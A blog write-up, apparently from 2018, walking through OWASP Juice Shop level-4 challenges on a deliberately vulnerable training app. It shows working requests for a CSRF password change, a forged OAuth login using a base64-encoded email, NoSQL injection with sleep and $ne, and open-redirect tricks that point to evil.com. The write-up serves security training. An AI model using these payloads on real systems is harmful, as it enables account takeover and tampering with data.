---
layout: post
title:  "OWASP Juice Shop v7.3.0 - Level 4"
date:   2018-08-08
---

[OWASP Juice Shop](https://www.owasp.org/index.php/OWASP_Juice_Shop_Project)

![level 4](/img/owasp-juice-shop-v7.3.0/juice016.png) <!--TODO-->

# CSRF
> Change Bender's password into slurmCl4ssic without using SQL Injection.

Start by performing a normal password reset to observe the flow. A submission to the Change Password form looks like this,

```
GET /rest/user/change-password?current=passpass&new=passpass2&repeat=passpass2 HTTP/1.1
[...]
```

```
HTTP/1.1 200 OK
[...]

{"user":{"id":9,"email":"a@a.a","password":"49bbdb096bd59f0869ed9e877771505c","createdAt":"2018-08-02T00:56:00.473Z","updatedAt":"2018-08-08T01:01:44.506Z"}}
```

I expecpted this would be a GET request as it's a CSRF challenge and presumably we'll have Bender click a link to change his password.

Wouldn't it be super bad if the application would accept a change of password request that didn't include the current password?

```
GET /rest/user/change-password?new=passpass3&repeat=passpass3 HTTP/1.1
[...]
```

```
HTTP/1.1 200 OK
[...]

{"user":{"id":9,"email":"a@a.a","password":"db191973767f53d7b66d53f591cf2397","createdAt":"2018-08-02T00:56:00.473Z","updatedAt":"2018-08-08T01:02:32.754Z"}}
```

Oops! That's not good. We can confirm the password change was effective by logging in as `a@a.a` with the new password - looks good.

Now, construct a URL that if clicked by Bender would result in his password beign changed to 'slurmCl4ssic.'

```
http://juice.shop:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic
```

Since Bender isn't a real person and we can't use phishing or some related activity to cause him to click our link while logged in, we'll log in ourselves using the solution from [Login Bender of Level 3](/2018/08/07/owasp-juice-shop-v7.3.0-level-3.html) and paste the above URL into the browser.

![csrf](/img/owasp-juice-shop-v7.3.0/juice078.png)

Bingo.

![csrf](/img/owasp-juice-shop-v7.3.0/juice079.png)

# Easter Egg Tier 1
> Find the hidden easter egg.

We know there's a file called `easere.gg` in the `/ftp` directory and how to download non-markdown files from there as in the [Forgotten Sales Backup challenge of Level 3](/2018/08/07/owasp-juice-shop-v7.3.0-level-3.html).

![eastere](/img/owasp-juice-shop-v7.3.0/juice070.png)

Hmm...

![eastere](/img/owasp-juice-shop-v7.3.0/juice071.png)

# Easter Egg Tier 2
> Apply some advanced cryptanalysis to find the real easter egg.

The site [quipquip.com](https://quipqiup.com/) is so insanely useful, I usually go there first with any sort of cryptogram or similar puzzle. It didn't get it exactly this time, but was so close I could easily figure it out. With a little bit of a hint,

![eastere](/img/owasp-juice-shop-v7.3.0/juice072.png)

Got it.

```
0	-1.632	/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
1	-1.832	/the/devs/are/sb/jonny/they/hid/an/easter/egg/within/the/easter/egg
2	-2.082	/the/devs/rne/so/jimmy/they/had/rm/ersten/egg/latham/the/ersten/egg
3	-2.082	/the/devs/rne/so/fully/they/had/rl/ersten/egg/cathal/the/ersten/egg
4	-2.117	/the/devs/kre/so/jimmy/they/had/km/ekster/egg/latham/the/ekster/egg
5	-2.128	/the/devs/are/so/unccy/they/hid/ac/easter/egg/lithic/the/easter/egg
[...]
```

Assuming it's a URL and visiting... holy crap what is that!

![eastere](/img/owasp-juice-shop-v7.3.0/juice073.png)

![eastere](/img/owasp-juice-shop-v7.3.0/juice074.png)

I noticed there's some kind of shape drawn over the north pole, but I'm not sure what it is or if it could be related to another challenge.

![eastere](/img/owasp-juice-shop-v7.3.0/juice075.png)

# Eye Candy
> Travel back in time to the golden era of web design.

# Forgotten Developer Backup
> Access a developer's forgotten backup file.

A little surprised to find yet another challenge with the same solution, but here there it is:  double-encoded null byte once more.

![dev](/img/owasp-juice-shop-v7.3.0/juice076.png)

Maybe they intended that I do something else on an earlier challenge, oh well.

![dev](/img/owasp-juice-shop-v7.3.0/juice077.png)

# Login Bjoern
> Log in with Bjoern's user account without previously changing his password, applying SQL Injection, or hacking his Google account.

Turns out the entire time I've been doing this something has been missing from the login form. At the beginning of [Level 1](/2018/07/31/owasp-juice-shop-v7.3.0-level-1.html) I mentioned that I added `juice.shop` to my `/etc/hosts` just to pretty up the URL.

Occasionally I've seen this error in the Javascript console but didn't look into it.

```
"http://juice.shop:3000 is not an authorized redirect URI for this application."
```

This is the login I've been seeing.

![oauth](/img/owasp-juice-shop-v7.3.0/juice080.png)

But visiting `http://localhost:3000` instead of `http://juice.shop:3000` I see this login form,

![oauth](/img/owasp-juice-shop-v7.3.0/juice081.png)

`juice-shop.min.js` appears to contain some kind of URL whitelist related to the OAuth button - oops!

```
var s = 'https://accounts.google.com/o/oauth2/v2/auth',
l = '1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com',
c = {
  'http://demo.owasp-juice.shop': 'http://demo.owasp-juice.shop',
  'https://juice-shop.herokuapp.com': 'https://juice-shop.herokuapp.com',
  'http://juice-shop.herokuapp.com': 'http://juice-shop.herokuapp.com',
  'http://preview.owasp-juice.shop': 'http://preview.owasp-juice.shop',
  'https://juice-shop-staging.herokuapp.com': 'https://juice-shop-staging.herokuapp.com',
  'http://juice-shop-staging.herokuapp.com': 'http://juice-shop-staging.herokuapp.com',
  'http://localhost:3000': 'http://localhost:3000',
  'http://juice.sh': 'http://juice.sh',
  'http://192.168.99.100:3000': 'http://tinyurl.com/ipMacLocalhost'
},
u = a.protocol() + '://' + location.host;
n.oauthUnavailable = !c[u],
n.oauthUnavailable && console.log(u + ' is not an authorized redirect URI for this application.')
```

To get a feel for the Google OAuth login, I've set up a new Gmail account to perform a test login. From the user's perspective, the flow works. I was taken to a Google page where I logged in with Gmail credentials, then back to Juice Shop where I was magically logged in with my Gmail email as the username.

Looking at the requests, one was sent to Google...

```
GET /oauth2/v1/userinfo?alt=json&access_token=[...] HTTP/1.1
Host: www.googleapis.com
[...]
```

Followed by a POST to the Juice Shop API aparently to create a user for using my Gmail email.

```
POST /api/Users/ HTTP/1.1
Host: localhost:3000
[...]

{"email":"totallynotn0j@gmail.com","password":"dG90YWxseW5vdG4wakBnbWFpbC5jb20="}
```

```
HTTP/1.1 201 Created
[...]

{"status":"success","data":{"id":9,"email":"totallynotn0j@gmail.com","password":"fb3a4ddfc0a48982c62614a719d38b52","updatedAt":"2018-08-08T04:47:25.127Z","createdAt":"2018-08-08T04:47:25.127Z"}}
```

Finally, another POST to Juice Shop to log my in as the Gmail user.

```
POST /rest/user/login HTTP/1.1
Host: localhost:3000
[...]

{"email":"totallynotn0j@gmail.com","password":"dG90YWxseW5vdG4wakBnbWFpbC5jb20=","oauth":true}
```

The bits sent to Juice Shop do not resemble much of anything to do with OAuth, all I see is a base64 string and my email address. What's in the base64 string?

```
root@kali ~/JuiceShop# echo -n 'dG90YWxseW5vdG4wakBnbWFpbC5jb20=' | base64 -d
totallynotn0j@gmail.com⏎
```

Oh no! Soooo, can we login by just using our email address in base64 as the password and adding `"oauth":true` to the POST request? I'll try it with Bjoern by modifying the request in the Burp proxy on the fly so the browser will get all the resulting cookies, etc.

```
root@kali ~/JuiceShop# echo -n 'bjoern.kimminich@googlemail.com' | base64
YmpvZXJuLmtpbW1pbmljaEBnb29nbGVtYWlsLmNvbQ==
```

![oauth](/img/owasp-juice-shop-v7.3.0/juice082.png)

![oauth](/img/owasp-juice-shop-v7.3.0/juice083.png)

That is an outrageously bad implementation of OAuth, ouch!

![oauth](/img/owasp-juice-shop-v7.3.0/juice084.png)

# Misplaced Signature File
> Access a misplaced SIEM signature file.

Security Information and Event Management (SIEM) has to do with logs, errors, etc. There's a filename that has to do with errors in the `/ftp` directory, perhaps this is a yet-another-double-encoded-null-byte challenge.

![siem](/img/owasp-juice-shop-v7.3.0/juice085.png)

Make a mental note of the file's contents, could be relevant later.

![siem](/img/owasp-juice-shop-v7.3.0/juice086.png)

# NoSQL Injection Tier 1
> Let the server sleep for some time. (It has done more than enough hard work for you)

We know from the [architecture overview of Juice Shop](https://github.com/bkimminich/pwning-juice-shop/blob/master/introduction/architecture.md) that some of the backend database is SQLite and some is MarsDB (MongoDB). We already know some parts of the application that use SQLite from previous SQL injection challenges like the login form and search box.

Poke around until we find something that smells NoSQL-y.

```
GET /rest/product/'/reviews HTTP/1.1
[...]
```

```
HTTP/1.1 500 Internal Server Error
[...]

{
  "error": {
    "message": "Invalid or unexpected token",
    "stack": "SyntaxError: Invalid or unexpected token\n    at Function (<anonymous>)\n    at Object.$where (/juice-shop/node_modules/marsdb/dist/DocumentMatcher.js:419:23)\n    at /juice-shop/node_modules/marsdb/dist/DocumentMatcher.js:211:46\n    at fastForEachObject (/juice-shop/node_modules/fast.js/object/forEach.js:21:5)\n    at fastForEach (/juice-shop/node_modules/fast.js/forEach.js:20:12)\n    at compileDocumentSelector (/juice-shop/node_modules/marsdb/dist/DocumentMatcher.js:203:25)\n    at DocumentMatcher._compileSelector (/juice-shop/node_modules/marsdb/dist/DocumentMatcher.js:153:14)\n  
    [...]
```

There we go, a MarsDB error.

I do NoSQL injection infrequently enough that I ususally do some reading before attempting it as a refresher. The first thing I stumbled on that worked was from [Rapid7](https://blog.rapid7.com/2014/06/12/you-have-no-sql-inj-sorry-nosql-injections-in-your-application/), the simple payload `8||true` which attempts to match all items.

```
GET /rest/product/8||true/reviews HTTP/1.1
[...]
```

```
HTTP/1.1 200 OK
[...]

{"status":"success","data":[{"message":"One of my favorites!","author":"admin@juice-sh.op","product":1,"_id":"Au437SixcxCmq7Eur"},{"message":"I bought it, would buy again. 5/7","author":"admin@juice-sh.op","product":3,"_id":"RBuGZTJnPMEWb3gEM"},{"message":"Fry liked it too.","author":"bender@juice-sh.op","product":6,"_id":"XYQc8Q3buB3HP46xs"},{"message":"I straight-up gots nuff props fo'these tattoos!","author":"mc.safesearch@juice-sh.op","product":16,"_id":"688Aqexebkm7uTaz3"},{"message":"This thang would look phat on Bobby's jacked fur coat!","author":"mc.safesearch@juice-sh.op","product":19,"_id":"hTWuGmdkSPcWxCWRN"},{"message":"Looks so much better on my uniform than the boring Starfleet symbol.","author":"jim@juice-sh.op","product":19,"_id":"P74mFvKC27y2T96Am"},{"message":"Fresh out of a replicator.","author":"jim@juice-sh.op","product":21,"_id":"TATn24nfvDb5NsdDA"},{"message":"Even more interesting than watching Interdimensional Cable!","author":"morty@juice-sh.op","product":31,"_id":"fdkrr6sfoeNiTYr6N"}]}
```

Nice! The 500 error we saw earlier referenced $where. The [MongoDB documentation on $where](https://docs.mongodb.com/manual/reference/operator/query/where/#op._S_where) indicates that it's quite flexible, and includes a list of functions that are available inside. Fortunately for us, `sleep()` is one of them.

Maybe just pop a `sleep()` in there and hope it gets evaluated?

```
GET /rest/product/8||sleep(5000)/reviews HTTP/1.1
```

```
HTTP/1.1 200 OK
[...]

{"status":"success","data":[]}
```

Yep.

![nosql](/img/owasp-juice-shop-v7.3.0/juice087.png)

# NoSQL Injection Tier 2
> Update multiple product reviews at the same time.

Recall that a logged-in user can edit their own product reviews through the webapp.

![nosql](/img/owasp-juice-shop-v7.3.0/juice088.png)

Looking at the request/response when performing this action normally, 

```
PATCH /rest/product/reviews HTTP/1.1
[...]

{"id":"Au437SixcxCmq7Eur","message":"n0j was here"}
```

```
HTTP/1.1 200 OK
[...]

{"modified":1,"original":[{"message":"One of my favorites!","author":"admin@juice-sh.op","product":1,"_id":"Au437SixcxCmq7Eur"}],"updated":[{"message":"n0j was here","author":"admin@juice-sh.op","product":1,"_id":"Au437SixcxCmq7Eur"}]}
```

We'd like to do some NoSQL injection that causes the `id` to match all records in the database with the hopes that it will cause a mass update on all reviews.

In this case since the body of the request is JSON we can't do something like solution to the previous challenge. The first shown below is valid JSON but doesn't result in injection becuase the payload is interpretted as a string, and the second is not valid JSON and causes an HTTP 500.

```
{"id":"8||true","message":"n0j was here"}
{"id":8||true,"message":"n0j was here"}
```

Reading up on [operators](https://docs.mongodb.com/manual/tutorial/query-documents/), try this. 

```
PATCH /rest/product/reviews HTTP/1.1
[...]

{"id":{"$ne": 8},"message":"n0j was here"}
```

```
HTTP/1.1 200 OK
[...]

{"modified":10,"original":[{"message":"I straight-up gots nuff props fo'these tattoos!","author":"mc.safesearch@juice-sh.op","product":16,"_id":"688Aqexebkm7uTaz3"},{"message":"One of my favorites!","author":"admin@juice-sh.op","product":1,"_id":"Au437SixcxCmq7Eur"},{"message":"Looks so much better on my uniform than the boring Starfleet symbol.","author":"jim@juice-sh.op","product":19,"_id":"P74mFvKC27y2T96Am"},{"message":"I bought it, would buy again. 5/7","author":"admin@juice-sh.op","product":3,"_id":"RBuGZTJnPMEWb3gEM"},{"message":"Fresh out of a replicator.","author":"jim@juice-sh.op","product":21,"_id":"TATn24nfvDb5NsdDA"},{"message":"Fry liked it too.","author":"bender@juice-sh.op","product":6,"_id":"XYQc8Q3buB3HP46xs"},{"product":"8||true","message":"n0j was here","author":"Anonymous","_id":"Yz9R5DtShmo5543Sq"},{"message":"Even more interesting than watching Interdimensional Cable!","author":"morty@juice-sh.op","product":31,"_id":"fdkrr6sfoeNiTYr6N"},{"message":"This thang would look phat on Bobby's jacked fur coat!","author":"mc.safesearch@juice-sh.op","product":19,"_id":"hTWuGmdkSPcWxCWRN"},{"product":"1","message":"n0j was here","author":"Anonymous","_id":"qzmYnmTw29tLCr4Z4"}],"updated":[{"message":"n0j was here","author":"mc.safesearch@juice-sh.op","product":16,"_id":"688Aqexebkm7uTaz3"},{"message":"n0j was here","author":"admin@juice-sh.op","product":1,"_id":"Au437SixcxCmq7Eur"},{"message":"n0j was here","author":"jim@juice-sh.op","product":19,"_id":"P74mFvKC27y2T96Am"},{"message":"n0j was here","author":"admin@juice-sh.op","product":3,"_id":"RBuGZTJnPMEWb3gEM"},{"message":"n0j was here","author":"jim@juice-sh.op","product":21,"_id":"TATn24nfvDb5NsdDA"},{"message":"n0j was here","author":"bender@juice-sh.op","product":6,"_id":"XYQc8Q3buB3HP46xs"},{"product":"8||true","message":"n0j was here","author":"Anonymous","_id":"Yz9R5DtShmo5543Sq"},{"message":"n0j was here","author":"morty@juice-sh.op","product":31,"_id":"fdkrr6sfoeNiTYr6N"},{"message":"n0j was here","author":"mc.safesearch@juice-sh.op","product":19,"_id":"hTWuGmdkSPcWxCWRN"},{"product":"1","message":"n0j was here","author":"Anonymous","_id":"qzmYnmTw29tLCr4Z4"}]}
```

![nosql](/img/owasp-juice-shop-v7.3.0/juice089.png)

One item puzzles me here and it's the fact that we've wrapped `$ne` in double quotes. We need to in order to have valid JSON (and that's why I tried it), but there would not be quotes in the NoSQL syntax itself, like `{ $ne: 8 }`. The mechanism to go from our JSON to the NoSQL syntax that MarsBD sees and exactly what transformations are performed in that step are unclear to me. Also, again we can't just wrap the whole thing in quotes or it's just interpreted as a string.

```
PATCH /rest/product/reviews HTTP/1.1
[...]

{"id":"{$ne: 8}","message":"n0j was here"}
```

```
HTTP/1.1 200 OK
[...]

{"modified":0,"original":[],"updated":[]}
```

# Redirects Tier 2
> Wherever you go, there you are.

This one was a little strange in that I 'solved' it in a way that doesn't actually work. Recall there are links that use redirection in the merchanidise area at the bottom of the Your Basket screen. They look like this,

```
http://juice.shop:3000/redirect?to=http://shop.spreadshirt.com/juiceshop
```

Playing with null characters again,

```
GET /redirect?to=http://google.com%00http://shop.spreadshirt.com/juiceshop HTTP/1.1
[...]
```

```
HTTP/1.1 302 Found
X-Powered-By: Express
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Location: http://google.com%00http://shop.spreadshirt.com/juiceshop
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 158
Date: Thu, 09 Aug 2018 00:11:08 GMT
Connection: close

<p>Found. Redirecting to <a href="http://google.com%00http://shop.spreadshirt.com/juiceshop">http://google.com%00http://shop.spreadshirt.com/juiceshop</a></p>
```

![redirect](/img/owasp-juice-shop-v7.3.0/juice091.png)

It worked as far as fooling the redirect, but... doesn't quite work.

![redirect](/img/owasp-juice-shop-v7.3.0/juice090.png)

A different idea - use the whitelisted URL as a parameter to one not on the whitelist. The redirect appears to just look for the whitelist URL as a substring of whatever we provide. For fun, make it a functioning Google search,

```
GET /redirect?to=https://www.google.com/search?q=http://shop.spreadshirt.com/juiceshop HTTP/1.1
[...]
```

```
HTTP/1.1 302 Found
X-Powered-By: Express
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Location: https://www.google.com/search?q=http://shop.spreadshirt.com/juiceshop
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 182
Date: Thu, 09 Aug 2018 00:24:27 GMT
Connection: close

<p>Found. Redirecting to <a href="https://www.google.com/search?q=http://shop.spreadshirt.com/juiceshop">https://www.google.com/search?q=http://shop.spreadshirt.com/juiceshop</a></p>
```

I think the idea in general here is that you could redirect to a domain controlled by the attacker and just discard the parameter on that server.

```
GET /redirect?to=http://evil.com/?http://shop.spreadshirt.com/juiceshop HTTP/1.1
[...]
```

# Reset Bender's Password
> Reset Bender's password via the Forgot Password mechanism with the original answer to his security question.

Another celebrity password hint research project, this time for Bender from Futurama (I don't believe there are any other famous Benders).

![bender](/img/owasp-juice-shop-v7.3.0/juice092.png)

This one was a lot more difficult than Captain Kirk. Eventually we find `Stop'n'Drop`.

![bender](/img/owasp-juice-shop-v7.3.0/juice093.png)

# Typosquatting Tier 1
> Inform the shop about a typosquatting trick it has become victim of. (Mention the exact name of the culprit)

# User Credentials
> Retrieve a list of all user credentials via SQL Injection

We know from an earlier challenge we can see the SQL used by the search form in an easily-provoked error.

```
GET /rest/product/search?q=%27foo HTTP/1.1
[...]
```

```
HTTP/1.1 500 Internal Server Error
[...]

{
  "error": {
    "message": "SQLITE_ERROR: near \"foo\": syntax error",
    "stack": "SequelizeDatabaseError: SQLITE_ERROR: near \"foo\": syntax error\n    at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n    at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n    at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n    at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)",
    "name": "SequelizeDatabaseError",
    "parent": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Products WHERE ((name LIKE '%'foo%' OR description LIKE '%'foo%') AND deletedAt IS NULL) ORDER BY name"
    },
    "original": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Products WHERE ((name LIKE '%'foo%' OR description LIKE '%'foo%') AND deletedAt IS NULL) ORDER BY name"
    },
    "sql": "SELECT * FROM Products WHERE ((name LIKE '%'foo%' OR description LIKE '%'foo%') AND deletedAt IS NULL) ORDER BY name"
  }
}
```

That is, where `<>` is the user input,

```
SELECT * FROM Products WHERE ((name LIKE '%<>%' OR description LIKE '%<>%') AND deletedAt IS NULL) ORDER BY name
```

# Vulnerable Library
> Inform the shop about a vulnerable library it is using. (Mention the exact library name and version in your comment)

# XSS Tier 4
> Perform a persisted XSS attack with \<script\>alert("XSS")\</script\> bypassing a server-side security mechanism.